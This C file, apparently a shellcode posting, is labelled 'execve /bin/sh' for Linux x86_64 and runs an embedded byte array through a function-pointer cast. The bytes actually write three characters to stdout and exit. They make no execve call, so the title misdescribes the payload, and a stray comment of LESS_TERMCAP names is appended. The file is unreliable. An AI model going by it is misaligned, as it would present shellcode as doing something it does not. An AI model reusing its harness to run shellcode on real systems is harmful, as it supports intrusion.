/*
 * ;Category: Shellcode
 * ;Title: GNU/Linux x86_64 - execve /bin/sh
 * ;Author: m4n3dw0lf
 * ;Github: https://github.com/m4n3dw0lf
 * ;Date: 14/06/2017
 * ;Architecture: Linux x86_64
 * ;Tested on : #1 SMP Debian 4.9.18-1 (2017-03-30) x86_64 GNU/Linux
 */

#include <stdio.h>


int main()
{
	unsigned char shellcode[] = "\x68\x41\x41\x41\x41\x48\x89\xe6\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc2\x03\x00\x00\x00\x0f\x05\x48\xc7\xc0\x3c\x00\x00\x00\x48\x31\xff\x0f\x05";

	int (*ret)() = (int(*)())shellcode;
	ret();
}

// LESS_TERMCAP_mb  LESS_TERMCAP_md  LESS_TERMCAP_me  LESS_TERMCAP_se  LESS_TERMCAP_so  LESS_TERMCAP_ue  LESS_TERMCAP_us

